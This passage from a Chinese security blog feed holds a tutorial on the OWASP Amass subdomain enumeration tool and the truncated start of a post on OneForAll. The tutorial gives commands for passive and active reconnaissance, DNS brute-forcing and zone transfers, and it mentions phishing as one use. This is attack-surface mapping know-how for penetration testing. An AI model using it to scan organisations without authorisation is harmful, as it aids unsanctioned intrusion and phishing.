      <link href="/2024/03/04/6-amass-%E4%B8%80%E6%AC%BE%E5%8F%98%E5%BC%82%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/"/>
      <url>/2024/03/04/6-amass-%E4%B8%80%E6%AC%BE%E5%8F%98%E5%BC%82%E7%9A%84%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>OWASP Amass 项目使用开源信息收集和主动侦察技术来执行攻击面的网络映射和外部资产发现。</p><h3 id="github链接"><a href="#github链接" class="headerlink" title="github链接:"></a>github链接:</h3><p><a href="https://github.com/owasp-amass/amass?tab=readme-ov-file">https://github.com/owasp-amass/amass?tab=readme-ov-file</a></p><h3 id="下载链接"><a href="#下载链接" class="headerlink" title="下载链接:"></a>下载链接:</h3><p><a href="https://github.com/owasp-amass/amass/releases/tag/v4.2.0">https://github.com/owasp-amass/amass/releases/tag/v4.2.0</a></p><p><strong>使用的信息收集技术：</strong></p><table><thead><tr><th>技术</th><th>数据源</th></tr></thead><tbody><tr><td>蜜蜂</td><td>360PassiveDNS、Ahrefs、AnubisDB、BeVigil、BinaryEdge、BufferOver、BuiltWith、C99、Chaos、CIRCL、DNSDB、DNSRepo、Deepinfo、Detectify、FOFA、FullHunt、GitHub、GitLab、GrepApp、Greynoise、HackerTarget、Hunter、IntelX、LeakIX、Maltiverse、 Mnemonic、Netlas、Pastebin、PassiveTotal、PentestTools、Pulsedive、Quake、SOCRadar、Searchcode、Shodan、Spamhaus、Sublist3rAPI、SubdomainCenter、ThreatBook、ThreatMiner、URLScan、VirusTotal、Yandex、ZETAlytics、ZoomEye</td></tr><tr><td>证书</td><td>主动拉取（可选）、Censys、CertCentral、CertSpotter、Crtsh、Digitorus、FacebookCT</td></tr><tr><td>域名系统</td><td>暴力破解、反向 DNS 扫描、NSEC 区域行走、区域传输、FQDN 更改/排列、FQDN 基于相似性的猜测</td></tr><tr><td>路由</td><td>ASNLookup、BGPTools、BGPView、BigDataCloud、IPdata、IPinfo、RADb、Robtex、ShadowServer、TeamCymru</td></tr><tr><td>刮痧</td><td>滥用IPDB、Ask、百度、Bing、CSP 标头、DNSDumpster、DNSHistory、DNSSpy、DuckDuckGo、Gists、Google、HackerOne、HyperStat、PKey、RapidDNS、Riddler、Searx、SiteDossier、雅虎</td></tr><tr><td>网络档案</td><td>Arquivo、CommonCrawl、HAW、PublicWWW、UKWebArchive、Wayback</td></tr><tr><td>谁是</td><td>AlienVault、AskDNS、DNSlytics、ONYPHE、SecurityTrails、SpyOnWeb、WhoisXMLAPI</td></tr></tbody></table><hr><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h2 id=""><a href="#" class="headerlink" title="  "></a><a href="https://golang.org/dl/"><img src="https://camo.githubusercontent.com/4004c7b3350134d3d4f559db3c9820b398cbf16f069fad8a55a2f088e111e0fb/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f676f2d6d6f642f676f2d76657273696f6e2f6f776173702d616d6173732f616d617373" alt="去版本"></a> <a href="https://hub.docker.com/r/caffix/amass"><img src="https://camo.githubusercontent.com/15ae103c2a653f12d2862dd74b5b9f78df79baa14dc16a3bbc04460d61705db8/68747470733a2f2f696d672e736869656c64732e696f2f646f636b65722f70756c6c732f6361666669782f616d6173732e737667" alt="Docker 镜像"></a> <a href="https://github.com/owasp-amass/amass/releases/latest"><img src="https://camo.githubusercontent.com/6c4e2b61a93f20d608d6e54b59081cbc8bdb5471b4aa050c4b70459c030be6c6/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f6f776173702d616d6173732f616d6173732f6c61746573742f746f74616c2e737667" alt="GitHub 下载"></a></h2><blockquote><p><a href="https://github.com/owasp-amass/amass/blob/master/doc/install.md">您可以在安装指南</a>中找到一些其他安装变体。</p></blockquote><h3 id="预建包"><a href="#预建包" class="headerlink" title="预建包"></a>预建包</h3><ol><li>只需解压<a href="https://github.com/owasp-amass/amass/releases/latest">包即可</a></li><li>将预编译的二进制文件放入您的路径中</li><li>开始使用 OWASP Amass！</li></ol><h4 id="自制"><a href="#自制" class="headerlink" title="自制"></a>自制</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew tap owasp-amass/amass</span><br><span class="line">brew install amass</span><br></pre></td></tr></tbody></table></figure><h3 id="Docker容器"><a href="#Docker容器" class="headerlink" title="Docker容器"></a>Docker容器</h3><ol><li>安装<a href="https://www.docker.com/">Docker</a></li><li>通过运行拉取 Docker 镜像<code>docker pull caffix/amass</code></li><li>跑步<code>docker run -v OUTPUT_DIR_PATH:/.config/amass/ caffix/amass enum -d example.com</code></li></ol><p>卷参数允许 Amass 图形数据库在执行和输出文件之间保留以在主机系统上访问。Volume 选项的第一个字段（冒号左侧）是 Docker 外部的 amass 输出目录，而第二个字段是 Docker 内部的路径，amass 将在其中写入输出文件。</p><h3 id="从源头"><a href="#从源头" class="headerlink" title="从源头"></a>从源头</h3><ol><li>安装<a href="https://golang.org/doc/install">Go</a>并设置您的 Go 工作区</li><li>通过运行下载 OWASP Amass<code>go install -v github.com/owasp-amass/amass/v4/...@master</code></li><li>此时，二进制文件应该位于<code>$GOPATH/bin</code></li></ol><h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><h2 id="-1"><a href="#-1" class="headerlink" title=""></a><a href="https://pkg.go.dev/github.com/owasp-amass/amass/v4"><img src="https://camo.githubusercontent.com/343f881605faf63ad5d6889130b47fa935cc77d5b7841927dbb763466a1bff03/68747470733a2f2f706b672e676f2e6465762f62616467652f6769746875622e636f6d2f6f776173702d616d6173732f616d6173732f76343f75746d5f736f757263653d676f646f63" alt="戈多克"></a></h2><p>使用<a href="https://github.com/owasp-amass/amass/blob/master/doc/install.md">安装指南</a>开始。</p><p>请参阅<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">用户指南</a>以获取更多信息。</p><p>有关示例用法，请参阅<a href="https://github.com/owasp-amass/amass/blob/master/doc/tutorial.md">教程。</a></p><p>请参阅<a href="https://github.com/owasp-amass/amass/blob/master/doc/scripting.md">Amass 脚本引擎手册，</a>以更好地控制枚举过程。</p><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>无论您是渗透测试员、审计员、安全研究人员还是 CISO/IT 经理，您都可能有几个合理的理由来绘制组织的外部攻击面。此过程也称为侦察或信息收集。</p><p><a href="https://owasp.org/www-project-amass/">OWASP Amass 项目</a> (Amass) 可以在很大程度上根据您的要求提供帮助。在这篇博文中，我们的目标是演示如何使用 Amass 来发现组织的大部分外部暴露资产。</p><p>重点将是执行连续的子域发现练习。我们已将这篇博文分为不同的部分，以便您更轻松地掌握 Amass 的各种功能。应该注意的是，可能存在未映射到域的资产，您需要采用其他技术来发现它们，例如在组织拥有的 IP 范围上运行网络扫描。虽然我们不会完全演示如何使用 Amass 提供的所有功能，但我们希望这篇博客能够涵盖足够的内容，让您能够快速掌握该收集工具。</p><h2 id="为什么选择-OWASP-Amass？"><a href="#为什么选择-OWASP-Amass？" class="headerlink" title="为什么选择 OWASP Amass？"></a>为什么选择 OWASP Amass？</h2><p>有大量开源工具和软件可用于枚举子域、自治系统编号 (ASN) 以及组织拥有的其他资产。尽管这些工具中的大多数在利用特定方法方面都非常出色，但它们并不总是得到积极维护和更新以跟上最新的技术和方法。说实话，大多数可用的工具都不完整，仅仅依赖这些工具可能会产生错误的安全感或导致丢失易受攻击的资产。现实情况是，子域名现在可以在任何地方公开，例如社交媒体、Pastebin、源代码存储库、HTTP 标头等。</p><p>Amass 得到 OWASP 的支持，这应该会为结果带来威望和信心。它得到积极维护，并且可能会得到长期支持，这意味着未来的任何错误都将得到解决。此外，Amass 的采用率很高，这可能意味着更好的数据一致性以及与其他工具的集成。因此，它可以构成一个更好、更值得信赖的工具，用于证明概念和参与。这可以更轻松地说服您的客户或经理使用它来定期绘制组织的攻击面。</p><p>还有许多更多的技术原因，我们将在下面解释并稍后更详细地演示：</p><ul><li>带有 3 个子命令，换句话说就是函数：<ul><li>amass intel – 发现枚举的目标命名空间</li><li>amass enum – 执行枚举和网络映射</li><li>amass db – 操作 Amass 图形数据库</li></ul></li><li>在某些情况下，Amass 的子命令可以结合使用，这可以让您创建执行多个 Amass 操作的脚本。</li><li>在撰写本文时，作为其子域发现和信息收集技术的一部分，支持超过 80 个来源，例如 API 和网站。可以使用以下命令列出这些：<ul><li>大量枚举列表</li><li><code>AlienVault,ArchiveIt,Arquivo,Ask,Baidu,BinaryEdge,Bing,BufferOver,Censys,CertSpotter,CIRCL,CommonCrawl,Crtsh,[...],VirusTotal,Wayback,WhoisXML,Yahoo</code>（完整列表<a href="https://github.com/owasp-amass/amass">在这里</a>）</li></ul></li><li>它采用各种信息收集技术进行 DNS 枚举<ul><li>使用域名单词列表和更改单词列表对子域进行暴力破解</li><li>通过读取 SSL/TLS 证书、执行 DNS 区域传输或检查证书透明度日志来识别子域</li><li>已识别域的递归子域发现</li><li>用于暴力破解子域的 Hashcat 式掩码（如果您有有关命名约定等的内部信息，这可能非常有用）</li></ul></li><li>它可以使用配置文件进行配置，这使得维护、使用或与脚本集成变得容易</li></ul><p>最后，我们不会在这篇博文中详细介绍安装 Amass，但如果您有兴趣，可以通过多种方式进行安装。如果您有正确配置的 Golang 环境 (Go &gt;= 1.20)，则可以从源代码进行编译，使用 Docker 运行它，或者如果您的发行版有可用的包，则可以将其安装为包。详细的安装说明可<a href="https://github.com/owasp-amass/amass/blob/master/doc/install.md">在此处</a>获取。</p><h2 id="积聚英特尔"><a href="#积聚英特尔" class="headerlink" title="积聚英特尔"></a>积聚英特尔</h2><p>Amass intel 子命令或模块（如果您需要）可以帮助收集有关组织的开源情报，并允许您找到与该组织相关的更多根域名。要查看此子命令的可用选项，只需在终端中键入：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ amass intel</span><br><span class="line">[...]</span><br><span class="line">Usage: amass intel [options] [-whois -d DOMAIN] [-addr ADDR -asn ASN -cidr CIDR]</span><br><span class="line">  -active</span><br><span class="line">        Attempt certificate name grabs</span><br><span class="line">  -addr value</span><br><span class="line">        IPs and ranges (192.168.1.1-254) separated by commas</span><br><span class="line">  -asn value</span><br><span class="line">        ASNs separated by commas (can be used multiple times)</span><br><span class="line">[...]</span><br></pre></td></tr></tbody></table></figure><p>此时可能值得注意的是，Amass 的另一个巨大好处是所有子命令都试图保持参数的一致性。</p><p>默认情况下，该子命令将使用许多信息收集技术和数据源（例如 WHOIS），以便获取组织拥有的情报和父域，除非在 Amass 的配置文件中明确禁用这些技术和数据源。<a href="https://github.com/owasp-amass/config/blob/master/examples/config.yaml">GitHub 配置存储库上</a>提供了示例 Amass 配置文件。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ amass intel -d owasp.org -whois</span><br><span class="line">appseceu.com</span><br><span class="line">owasp.com</span><br><span class="line">appsecasiapac.com</span><br><span class="line">appsecnorthamerica.com</span><br><span class="line">appsecus.com</span><br><span class="line">[...]</span><br><span class="line">owasp.org</span><br><span class="line">appsecapac.com</span><br><span class="line">appsecla.org</span><br><span class="line">[...]</span><br></pre></td></tr></tbody></table></figure><p>您还可以通过手动浏览数据源来确认上面的一些结果。在下面的屏幕截图中，我们对“OWASP Foundation”执行了反向 WHOIS 搜索，并发现了类似的域：</p><p><a href="https://viewdns.info/reversewhois/?q=OWASP+Foundation">https://viewdns.info/reversewhois/?q=OWASP+Foundation</a> <a href="https://github.com/owasp-amass/amass/blob/master/images/tutorial/viewdnsinfo_example.png?raw=true"><img src="https://github.com/owasp-amass/amass/raw/master/images/tutorial/viewdnsinfo_example.png?raw=true" alt="OWASP Amass 信息收集技术"></a></p><p>当使用 amass intel 执行搜索时，您始终可以使用更多配置选项来运行它，例如“-active”参数，它将尝试区域传输并主动扫描以获取 SSL/TLS 证书以提取信息。与任何参与一样，确保您有权对目标执行主动搜索。</p><p>此时值得注意的是，某些配置标志将无法与其他配置标志一起使用，在这种情况下，Amass 将简单地忽略它们。</p><p>Amass 的调查结果并不总是准确的，这可能有多种原因，例如，Amass 使用的数据源可能不一致或不是最新的。Amass 尝试使用 DNS 查询进一步验证信息，未来将实施更多验证技术。尽管 Amass 做得很好，但用户仍然应该对看似与目标无关的结果进行进一步的验证检查。这可以使用多种方法来执行，例如：</p><ul><li>使用实用程序来解析域（例如 dig、nslookup）</li><li>执行 WHOIS 查询以确认组织详细信息</li><li>在搜索引擎上的搜索结果，例如父域</li></ul><p>您还可以使用 Amass 查找组织名称，它可以返回分配给目标的 ASN ID，示例如下所示(已经测试中文)：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ amass intel -org 'Example Ltd'</span><br><span class="line">111111, MAIN_PRODUCT -- Example Ltd</span><br><span class="line">222222, SECONDARY_PRODUCT - Example Ltd</span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">Please note that the above data is fictitious for demonstration purposes. Retrieved ASNs could then be fed back into Amass. The below command attempts to retrieve registered domains found within the specified ASN and return them along with the IP address they resolve to (127.0.0.1 in this case for demonstration purposes):</span><br><span class="line"></span><br><span class="line">$ amass intel -active -asn 222222 -ip</span><br><span class="line">some-example-ltd-domain.com 127.0.0.1</span><br><span class="line">[...]</span><br></pre></td></tr></tbody></table></figure><h2 id="大量枚举"><a href="#大量枚举" class="headerlink" title="大量枚举"></a>大量枚举</h2><p>让我们转向 Amass 枚举，这是 Amass 大部分强大功能所在的地方。Amass 枚举允许您执行 DNS 枚举和目标映射，以确定组织暴露的攻击面。枚举结果存储在图形数据库中，该数据库将位于 Amass 的默认输出文件夹或带有“-dir”标志的指定输出目录中。其他 Amass 子命令也是如此。</p><h3 id="在被动或主动配置下运行-Amass"><a href="#在被动或主动配置下运行-Amass" class="headerlink" title="在被动或主动配置下运行 Amass"></a>在被动或主动配置下运行 Amass</h3><p>Amass enum 可以在被动或主动配置模式的上下文中执行。被动模式要快得多，但 Amass 不会验证 DNS 信息，例如通过解析子域。您可以使用“-passive”标志被动运行它，并且您将无法启用许多技术或配置，例如 DNS 暴力破解和名称更改。选择被动模式而不是主动模式有多种原因，例如：</p><ul><li>您需要了解所有可能已使用过且将来可能会重复使用的子域，这可能是因为您需要不断监控目标攻击面的变化，或者因为您正在进行网络钓鱼活动并寻找子域。</li><li>您的周边安全测试流程会在稍后阶段验证 DNS 信息，并需要快速收集结果。</li><li>由于安全参与的限制或要求，您只能执行被动信息收集。</li></ul><p>在下面的示例中，我们在 owasp.org 上被动搜索子域(以测试)：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ amass enum -passive -d owasp.org</span><br><span class="line">[...]</span><br><span class="line">update-wiki.owasp.org</span><br><span class="line">[...]</span><br><span class="line">my.owasp.org</span><br><span class="line">www.lists.owasp.org</span><br><span class="line">www.ocms.owasp.org</span><br><span class="line">[...]</span><br></pre></td></tr></tbody></table></figure><p>值得一提的是，尽管 Amass intel 将帮助收集组织拥有的 IP 范围、ASN 和注册域，但 Amass enum 将识别所有子域。在我的测试机器上，这个子域枚举在 2 分钟内完成。这是一个稍微修改过的屏幕截图，显示了此枚举的结果：</p><p><a href="https://github.com/owasp-amass/amass/blob/master/images/tutorial/amass_passive_run_example.png?raw=true"><img src="https://github.com/owasp-amass/amass/raw/master/images/tutorial/amass_passive_run_example.png?raw=true" alt="用于子域发现的 OWASP Amass 枚举教程"></a></p><p>在主动配置模式下使用 Amass 意味着您将获得更准确的结果，并且可以发现更多资产，因为所有 DNS 枚举技术都将启用。应该注意的是，“主动配置模式”并不是严格指“-active”标志，该标志启用 SSL/TLS 服务的区域传输和端口扫描，并抓取其证书以从证书字段中提取任何子域（例如 Common姓名）。</p><p>下面的命令（稍后详细解释）可以被认为是总体活跃的，因为它以多种方式（单词列表、掩码等）执行子域暴力破解，并且启用了“-active”标志。所有结果都将由 Amass 使用默认或指定的解析器进行验证：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ amass enum -active -d owasp.org -brute -w /root/dns_lists/deepmagic.com-top50kprefixes.txt -ip -dir amass4owasp -config /root/amass/config.yaml -o amass_results_owasp.txt</span><br></pre></td></tr></tbody></table></figure><p><a href="https://github.com/owasp-amass/amass/blob/master/images/tutorial/amass_active_run_example.png?raw=true"><img src="https://github.com/owasp-amass/amass/raw/master/images/tutorial/amass_active_run_example.png?raw=true" alt="使用 OWASP Amass 执行子域发现练习"></a></p><p>我们上面使用的命令指定 Amass 图形数据库以及日志文件将存储在“./amass4owasp”。我们还要求 Amass 使用“-ip”标志显示其解析名称的 IP 地址。我们使用“-w”参数为 Amass 提供了 <a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/DNS">deepmagic</a> DNS 单词列表，并使用“-config”指定了 config.yaml 文件的位置，并使用“-o”指定了输出。</p><p>虽然上面的命令希望很简单，但我们想提供一些进一步的说明：</p><ul><li>在这种情况下，Amass 将在 config.yaml 文件中检查 DNS 解析器，或使用 Amass 代码中嵌入的默认解析器。您还可以使用“-r”和“-rf”标志或在 config.yaml 文件中指定自己的 DNS 解析器。使用“-r”标志，您可以在命令行指定 DNS 解析器的 IP 地址，而使用“-rf”，您可以在每行指定包含这些地址的文件。</li><li>我们可以在 config.yaml 文件中指定所有这些配置，并使用“-config”将其提供给 Amass。此时值得说明的是，命令行参数将优先于 config.yaml 文件中指定的内容。因此，如果您在 config.yaml 文件中禁用暴力破解，但在命令行上提供“-brute”参数，则将使用暴力破解技术。</li><li>除非使用“-norecursive”明确禁用，否则上述命令将对默认识别的子域执行递归 DNS 枚举。</li></ul><p>此时，您还应该记住，如果您在短时间内从同一 IP 执行多个 Amass 操作，则该 IP 可能会被永久阻止 Amass 抓取的某些来源，例如 Google/Yahoo 搜索引擎。</p><p>为了以更有趣的方式结束本节，我们假设由于某种原因 OWASP 组织倾向于创建带有“zzz”前缀的子域，例如 zzz-dev.owasp.org。您可以利用 Amass 的 hashcat 式单词列表掩码功能，使用以下命令来暴力破解“zzz-[az][az][az].owasp.org”的所有组合：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ amass enum -d owasp.org -norecursive -wm "zzz-?l?l?l" -dir amass4owasp</span><br></pre></td></tr></tbody></table></figure><p>请注意，在上面的配置中，我们已明确禁用递归 DNS 枚举，因为我们希望仅使用掩码获得更快的结果。</p><p>最后，您可以随时检查输出目录中的 Amass 日志文件，以确保您的配置按预期工作：</p><p><a href="https://github.com/owasp-amass/amass/blob/master/images/tutorial/amass_logs_example2.png?raw=true"><img src="https://github.com/owasp-amass/amass/raw/master/images/tutorial/amass_logs_example2.png?raw=true" alt="OWASP Amass 使用 hashcat 掩码进行高级子域发现"></a></p><h2 id="海量数据库"><a href="#海量数据库" class="headerlink" title="海量数据库"></a>海量数据库</h2><p>您可以使用此子命令与 Amass 图形数据库（默认数据库或使用“-dir”标志指定的数据库）进行交互。</p><p>例如，以下命令将列出您在 owasp.org 上执行的枚举过程中发现并存储在“amass4owasp”图形数据库中的所有名称：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ amass db -dir amass4owasp -names -d owasp.org</span><br></pre></td></tr></tbody></table></figure><p>接下来，使用类似的命令，您可以检索 owasp.org 的完整输出并将其存储在“amass4owasp”图形数据库中：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ amass db -dir amass4owasp -d owasp.org -show -ip</span><br></pre></td></tr></tbody></table></figure><p>您可能希望出于统计或历史目的维护相同的 Amass 输出目录，通过该目录执行所有子域枚举练习，因为 Amass 跟踪只能针对相同的图形数据库和输出目录使用。</p><h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>最后，OWASP Amass 是一个越来越受欢迎的项目。如果您有信息收集和子域发现需求，我们强烈建议您将 Amass 纳入您的工作流程/流程中，并且随着每个版本都会添加越来越多的功能和改进，请继续关注。最后，您可以随时参考 Amass 的官方<a href="https://github.com/owasp-amass/amass/blob/master/doc/user_guide.md">用户指南</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OneForAll-功能及其强大的子域名收集器</title>
      <link href="/2024/03/04/23-OneForAll-%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%99%A8/"/>
      <url>/2024/03/04/23-OneForAll-%E5%8A%9F%E8%83%BD%E5%BC%BA%E5%A4%A7%E7%9A%84%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E5%99%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="OneForAll-一款功能及其强大的子域名收集器"><a href="#OneForAll-一款功能及其强大的子域名收集器" class="headerlink" title="OneForAll-一款功能及其强大的子域名收集器"></a>OneForAll-一款功能及其强大的子域名收集器</h1><p>github下载命令:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/shmilylty/OneForAll.git</span><br></pre></td></tr></tbody></table></figure><p>安装所需要库:</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">如果同时存在python和python3则用下方命令.如果仅有python3则使用pyton -m pip install -r XXXXXX.txt</span></span><br><span class="line">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></tbody></table></figure><p><a href="https://travis-ci.org/shmilylty/OneForAll"><img src="https://camo.githubusercontent.com/28d8eb019184e0c26904d9db5c78d1e12d6cb2075881a7dd9e0f51aef7e1a685/68747470733a2f2f7472617669732d63692e6f72672f73686d696c796c74792f4f6e65466f72416c6c2e7376673f6272616e63683d6d6173746572" alt="Build Status"></a> <a href="https://codecov.io/gh/shmilylty/OneForAll"><img src="https://camo.githubusercontent.com/af91a11feeb69e74125ef0f25a24b551829f5d82261b631d885198be740ee00f/68747470733a2f2f636f6465636f762e696f2f67682f73686d696c796c74792f4f6e65466f72416c6c2f6272616e63682f6d61737465722f67726170682f62616467652e737667" alt="codecov"></a> <a href="https://codeclimate.com/github/shmilylty/OneForAll/maintainability"><img src="https://camo.githubusercontent.com/30dcea766e6a01b3b5c96152a1ba9ece563166d0ba9dc79b6d2d4832db0def92/68747470733a2f2f6170692e636f6465636c696d6174652e636f6d2f76312f6261646765732f31323837363638613662346337326166363833652f6d61696e7461696e6162696c697479" alt="Maintainability"></a> <a href="https://github.com/shmilylty/OneForAll/tree/master/LICENSE"><img src="https://camo.githubusercontent.com/6495cd59ec5ee81d9cb19e7968764ffdcc5602965fc59078514555d8f4ee740a/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f73686d696c796c74792f4f6e65466f72416c6c" alt="License"></a> <a href="https://github.com/shmilylty/OneForAll/tree/master/"><img src="https://camo.githubusercontent.com/f05bb33587273c2995490cff0b4a8252973798fb0fef81ba873a990748fddbda/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f707974686f6e2d332e362b2d626c7565" alt="python"></a> <a href="https://github.com/shmilylty/OneForAll/releases"><img src="https://camo.githubusercontent.com/9a81975096841a305eebd1a14c923d87da2fe06ff76de01d2baa731231c4f711/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f72656c656173652d76302e342e352d627269676874677265656e" alt="python"></a></p><p>👊<strong>OneForAll是一款功能强大的子域收集工具</strong> 📝<a href="https://github.com/shmilylty/OneForAll/tree/master/docs/en-us/README.md">English Document</a></p><p><a href="https://github.com/shmilylty/OneForAll/blob/master/docs/usage_example.svg"><img src="https://github.com/shmilylty/OneForAll/raw/master/docs/usage_example.svg" alt="Example"></a></p><h2 id="🚀上手指南"><a href="#🚀上手指南" class="headerlink" title="🚀上手指南"></a>🚀上手指南</h2><p>📢 请务必花一点时间阅读此文档，有助于你快速熟悉OneForAll！</p><details style="box-sizing: border-box; display: block; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer;"><b style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">🐍安装要求</b></summary></details><details style="box-sizing: border-box; display: block; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer;"><b style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">✔安装步骤（git 版）</b></summary></details><details style="box-sizing: border-box; display: block; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer;"><b style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">✔安装步骤（docker 版）</b></summary></details><details style="box-sizing: border-box; display: block; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer;"><b style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">✨使用演示</b></summary></details><details style="box-sizing: border-box; display: block; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, &quot;Noto Sans&quot;, Helvetica, Arial, sans-serif, &quot;Apple Color Emoji&quot;, &quot;Segoe UI Emoji&quot;; font-size: 16px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; white-space: normal; background-color: rgb(255, 255, 255); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial;"><summary style="box-sizing: border-box; display: list-item; cursor: pointer;"><b style="box-sizing: border-box; font-weight: var(--base-text-weight-semibold, 600);">🧐结果说明</b></summary></details><details open="" style="box-sizing: border-box; display: block; margin-top: 0px; margin-bottom: 16px; color: rgb(31, 35, 40); font-family: 